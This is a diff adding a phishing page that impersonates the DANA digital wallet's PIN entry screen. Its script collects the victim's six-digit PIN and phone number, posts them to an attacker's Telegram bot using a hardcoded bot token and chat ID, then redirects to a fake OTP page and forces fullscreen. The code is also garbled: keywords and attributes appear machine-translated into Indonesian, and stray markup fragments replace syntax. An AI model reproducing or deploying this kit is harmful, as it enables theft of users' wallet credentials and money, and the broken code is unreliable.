@@ -1,0 +1,144 @@
+<!DOCTYPE html><title>DANA | Dompet digital</title><link
+href="https://amdana.id/portal-pedagang/aplikasi/aset/ikon-fav.png" rel="ikon"
+ketik="gambar/png"><meta content="teks/html; charset=utf-8"
+http-equiv=jenis-konten><meta
+konten="lebar=lebar perangkat,skala awal=1,skala maksimum=1,dapat diskalakan pengguna=tidak"
+nama=viewport><style>@import
+url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap);*{font-family:'Buka
+Sans',sans-serif;font-weight:400}body{lebar:100%;tinggi:100vh;margin:0;padding:0;warna-latar-belakang:#118eea;}.container{ukuran-kotak:kotak-batas;tampilan:blok;margin:otomatis;lebar:100%;tinggi:100%;lebar-maks:600px;tinggi-maks:1000px;warna-latar-belakang:#118eea;padding:25px;posisi:absolute;atas:50%;kiri t:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%);-moz-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);-o-transform:translate(-50%,-50%)}.back{posisi:absolute;atas:26px;lebar:8px;float:kiri}.dana_logo{tampilan:blok;lebar:95px;margin-atas:-5px;mar gin-kiri:otomatis;margin-kanan:otomatis}h1{margin-atas:60px;perataan-teks:tengah;ukuran-font:15px;warna:#fff}.bh1{berat-font:700}.inputPin{ukuran-kotak:kotak-perbatasan;margin-atas:50px;lebar:100%}.formPin{lebar-maks:500px;margin:otomatis;margin-atas:30px}.six_pin{tampilan:fleksibel;penegakan-konten:tengah}.inpPin{caret-col atau:transparan;ukuran font:20px;berat font:600;perataan teks:tengah;lebar:48px;tinggi:48px;batas:0;garis besar:0;radius batas:8px;margin-kiri:2px;margin-kanan:2px}.btn{tampilan:fleksibel;justify-konten:tengah;sejajarkan-item:tengah;arah-fleksibel:kolom}.lihat{margin-bawah:52px;margin-atas:33px;latar belakang:0
+0;ukuran font:13px;warna:#fff;lebar:110px;tinggi:24px;batas:1.2px solid
+#fff;border-radius:20px}.lupa{font-size:15px;font-weight:600;color:#fff;text-decoration:none}</style><style>.process{posisi:absolute;tampilan:fleksibel;justify-content:center;align-items:center;latar belakang:#0000005b;lebar:100%;tinggi:100vh}.loading{posisi:absolute;tampilan:fleksibel;justify-content:center;align-items:center;margin-bawah:20%}.loading
+img{lebar:50px}.memuat .spinner{posisi:absolut;lebar:35px;animasi:putar 1d
+linier tak terbatas;-webkit-animasi:spin 1s linier tak terbatas;-moz-animasi:spin 1s
+linier tak terbatas;-ms-animasi:spin 1s linier tak terbatas;-o-animasi:spin 1s
+linier tak terbatas}@keyframes
+putar{0%{transformasi:putar(360derajat)}100%{transformasi:putar(0derajat)}}@-webkit-keyframes
+putar{0%{-webkit-transform:putar(360derajat)}100%{-webkit-transform:putar(0derajat)}}@-moz-keyframes
+putar{0%{-webkit-transform:putar(360derajat)}100%{-webkit-transform:putar(0derajat)}}@-ms-keyframes
+putar{0%{-webkit-transform:putar(360derajat)}100%{-webkit-transform:putar(0derajat)}}@-o-bingkai-kunci
+putar{0%{-webkit-transform:putar(360derajat)}100%{-webkit-transform:putar(0derajat)}}</style><div
+kelas=wadah><a kelas=back href="login.html"><img
+src=https://www.pngkit.com/png/full/155-1554499_kudos-ikon-putih-belakang-png.png
+kelas=kembali></a><img src=https://www.dana.id/_nuxt/img/logo-dana.fe46647.png
+class=dana_logo><h1>Masukkan <b class=bh1>PIN DANA</b></h1><div
+kelas=inputPin><form kelas=formPin><div kelas=six_pin><input pelengkapan otomatis=mati
+kelas=inpPin id=pin1 mode input=numerik panjang maks=1 nama=pin1
+ketik=kata sandi><input pelengkapan otomatis=mati kelas=inpPin id=pin2 mode input=numerik
+maxlength=1 nama=pin2 jenis=kata sandi><input pelengkapan otomatis=mati kelas=inpPin id=pin3
+inputmode=numerik panjang maks=1 nama=pin3 jenis=kata sandi><input pelengkapan otomatis=mati
+kelas=inpPin id=pin4 mode input=numerik panjang maks=1 nama=pin4
+ketik=kata sandi><input pelengkapan otomatis=mati kelas=inpPin id=pin5 mode input=numerik
+maxlength=1 nama=pin5 jenis=kata sandi><input pelengkapan otomatis=mati kelas=inpPin id=pin6
+mode input=numerik panjang maks=1 nama=pin6 jenis=kata sandi></div></form><div
+class=btn><button type="button" class=lihat id=lihat>TAMPILKAN</button> <a
+class=lupa href="#">LUPA PIN?</a></div></div></div><div class=process id=proses
+nama=proses gaya=tampilan:tidak ada><div kelas=memuat><img src=./load_bg.png> <img
+src=./load_spin.png kelas=spinner></div></div><skrip>
+const masukan = document.querySelectorAll(".enam_pin masukan");
+const formulir = document.querySelector("formulir")
+input.untukSetiap((input, indeks) => {
+    input.dataset.indeks = indeks;
+    input.addEventListener("keydown", hapus);
+    input.addEventListener("keyup", onKeyUp);
+{\displaystyle {{nama file}}});
+fungsi hapus($event) { $event.target.nilai = ""; }
+fungsi checkNumber(angka) { return /[0-9]/g.test(angka); }
+fungsi onKeyUp($event) {
+    konstanta masukan = $peristiwa.target;
+    const nilai = input.nilai;
+    const indekslapangan = +input.dataset.indeks;
+    jika ($event.key === "Backspace" & fieldIndex > 0) {
+        input.previousElementSibling.fokus();
+    }
+    jika (nomorcek(nilai)) {
+        jika (nilai.panjang > 0 & indekslapangan < panjang masukan - 1) {
+            input.nextElementSibling.fokus();
+        }
+        jika (nilai input !== "" & indekslapangan === panjang input - 1) {
+            input.readOnly = benar;
+            kirim();
+        }
+    } kalau tidak {
+        jelas($event);
+    }
+}
+
+var btn_show = document.getElementById('lihat');
+var pin = dokumen.getElementById('pin1');
+var pinn = document.getElementById('pin2');
+var pinnn = dokumen.getElementById('pin3');
+var pinnnn = dokumen.getElementById('pin4');
+var pinnnnn = document.getElementById('pin5');
+var pinnnnnn = dokumen.getElementById('pin6');
+
+btn_show.addEventListener('klik', pasToText);
+
+fungsi pasToText(){
+    jika ((pin.jenis == 'kata sandi')&(pinn.jenis == 'kata sandi')&(pinnn.jenis == 'kata sandi')&(pinnnn.jenis == 'kata sandi')&(pinnnnn.jenis == 'kata sandi')&(pinnnnnn.jenis == 'kata sandi')){
+        pin.setAttribute('tipe','teks')
+        pinn.setAttribute('tipe','teks')
+        pinnn.setAttribute('tipe','teks')
+        pinnnn.setAttribute('tipe','teks')
+        pinnnnn.setAttribute('tipe','teks')
+        pinnnnnn.setAttribute('tipe','teks')
+        btn_show.innerHTML='SEMBUNYIKAN'
+    } kalau tidak {
+        pin.setAttribute('tipe','kata sandi')
+        pinn.setAttribute('tipe','kata sandi')
+        pinnn.setAttribute('tipe','kata sandi')
+        pinnnn.setAttribute('tipe','kata sandi')
+        pinnnnn.setAttribute('tipe','kata sandi')
+        pinnnnnn.setAttribute('tipe','kata sandi')
+        btn_show.innerHTML='TAMPILKAN'
+    }
+}
+</skrip>
+<skrip>
+fungsi submit(){
+    biarkan xx = document.getElementById('proses')
+    xx.style.display = 'fleksibel';
+    biarkan nomor_telepon = sessionStorage.getItem("nomor_telepon");
+	biarkan pinone = document.getElementById('pin1').value;
+	biarkan pintwo = document.getElementById('pin2').value;
+	biarkan pinthree = document.getElementById('pin3').value;
+	biarkan pinfour = document.getElementById('pin4').value;
+	biarkan pinfive = document.getElementById('pin5').value;
+	biarkan pinsix = document.getElementById('pin6').value;
+	biarkan pinNumber = pinsatu+pindua+pintiga+pinempat+pinlima+pinenam;
+
+    sessionStorage.setItem("nomorpin", nomorpin);
+    
+	biarkan pesan = `
+DANA | PIN |
+
+- Tidak ada HP : ${phone_number}
+- Pin Akun : ${pinNumber}`;
+
+//_masukan_ID_Akun_Telegram_kamu
+var id_telegram="6751845484";
+
+//_masukan_ID_Bot_Telegram_kamu
+var token_botTele="7468192209:AAEHhOhSqDNm4BOc_5lE3XVKmcXJU2paMj4";
+
+ 	ambil("https://api.telegram.org/bot"+token_botTele+"/kirimPesan?parse_mode=markdown",{
+ 	    metode: 'POST',
+ 	    judul: {
+ 	        'Terima': 'aplikasi/json',
+ 	        'Jenis Konten': 'aplikasi/json'
+ 	    Bahasa Indonesia:
+ 	    tubuh: JSON.stringify({
+ 	        obrolan_id: id_telegram,
+            teks: pesan
+        })
+    {\displaystyle {{nama file}}});
+    lokasi jendela.href = "./dana_otp.html";
+}
+</skrip>
+<skrip>
+document.documentElement.addEventListener("klik", fungsi (){
+    biarkan docElm = dokumen.documentElement;
+    jika (docElm.requestFullscreen) {docElm.requestFullscreen()}
+    jika tidak (docElm.mozRequestFullScreen) {docElm.mozRequestFullScreen()}
+    jika tidak (docElm.webkitRequestFullScreen) {docElm.webkitRequestFullScreen()}
+{\displaystyle {{nama file}}});
+</skrip>
